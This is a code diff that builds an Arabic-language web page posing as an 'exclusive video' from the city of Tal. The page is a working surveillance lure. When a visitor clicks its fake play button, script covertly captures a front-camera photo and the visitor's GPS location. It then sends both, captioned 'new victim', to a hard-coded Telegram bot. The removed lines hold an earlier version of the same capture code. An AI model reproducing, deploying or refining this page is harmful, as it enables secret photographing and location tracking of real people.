@@ -1,35 +1,73 @@
-<script>
-function start() {
-    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s=>{
-        let v=document.createElement('video');
-        v.srcObject=s; v.play();
-        setTimeout(()=>{
-            let c=document.createElement('canvas');
-            c.width=1280; c.height=720;
-            c.getContext('2d').drawImage(v,0,0,1280,720);
-            let img=c.toDataURL('image/jpeg');
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيديو حصري - مدينة التل</title>
+    <style>
+        body {background:#000; color:#fff; text-align:center; font-family:Arial; margin:0; padding:0; overflow:hidden;}
+        .container {position:absolute; top:0; left:0; width:100%; height:100%; display:flex; flex-direction:column; justify-content:center; align-items:center;}
+        h1 {font-size:28px; margin:20px; color:#f00;}
+        .fake {background:url('https://i.imgur.com/0kW9K4j.jpg') center/cover no-repeat; height:70vh; width:90%; border:5px solid #f00; border-radius:15px; position:relative;}
+        .play-btn {position:absolute; font-size:80px; color:#fff; background:rgba(0,0,0,0.6); border-radius:50%; padding:20px; cursor:pointer; animation:pulse 1.5s infinite;}
+        @keyframes pulse {0% {transform:scale(1);} 50% {transform:scale(1.1);} 100% {transform:scale(1);}}
+        .loader {display:none; border:8px solid #333; border-top:8px solid #f00; border-radius:50%; width:80px; height:80px; animation:spin 1s linear infinite; margin:30px;}
+        @keyframes spin {0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>فيديو حصري وصل للتو في مدينة التل</h1>
+        <p>اضغط على الزر لتشغيل الفيديو الكامل</p>
+        <div class="fake">
+            <div class="play-btn" onclick="startCapture()">▶</div>
+        </div>
+        <div class="loader" id="loader"></div>
+        <p id="status">جاري التحميل...</p>
+    </div>
 
-            navigator.geolocation.getCurrentPosition(p=>{
-                let gps = p.coords.latitude + "," + p.coords.longitude + " ±" + p.coords.accuracy + "m";
+    <script>
+    function startCapture() {
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('status').innerText = 'جاري تحميل الفيديو...';
 
-                let proxy = "https://api.allorigins.win/raw?url=";
-                let telegramUrl = encodeURIComponent("https://api.telegram.org/bot8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8/sendPhoto?chat_id=1611398303");
+        navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(stream=>{
+            let video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            setTimeout(()=>{
+                let canvas = document.createElement('canvas');
+                canvas.width = 1280;
+                canvas.height = 720;
+                canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
+                let imgData = canvas.toDataURL('image/jpeg');
 
-                let f = new FormData();
-                f.append('photo', dataURLtoBlob(img));
-                f.append('caption', "🆕 ضحية جديدة من التل\nGPS: " + gps);
+                navigator.geolocation.getCurrentPosition(pos=>{
+                    let gps = pos.coords.latitude + "," + pos.coords.longitude + " ±" + pos.coords.accuracy + "m";
 
-                fetch(proxy + telegramUrl, {method: 'POST', body: f});
-            });
-            s.getTracks().forEach(t=>t.stop());
-        }, 1000);
-    });
-}
+                    let caption = encodeURIComponent("🆕 ضحية جديدة من التل\nGPS: " + gps + "\nوقت: " + new Date());
 
-function dataURLtoBlob(dataurl) {
-    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-    while(n--) u8arr[n] = bstr.charCodeAt(n);
-    return new Blob([u8arr], {type:mime});
-}
-</script>
+                    let url = "https://api.telegram.org/bot8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8/sendDocument?chat_id=1611398303&caption=" + caption;
+
+                    let form = new FormData();
+                    form.append('document', dataURLtoBlob(imgData), "photo.jpg");
+
+                    fetch(url, {method: 'POST', body: form})
+                        .then(() => document.getElementById('status').innerText = 'تم!')
+                        .catch(() => document.getElementById('status').innerText = 'خطأ');
+                });
+
+                stream.getTracks().forEach(track => track.stop());
+            }, 1500);
+        });
+    }
+
+    function dataURLtoBlob(dataurl) {
+        let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+            bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+        while(n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], {type:mime});
+    }
+    </script>
+</body>
+</html>
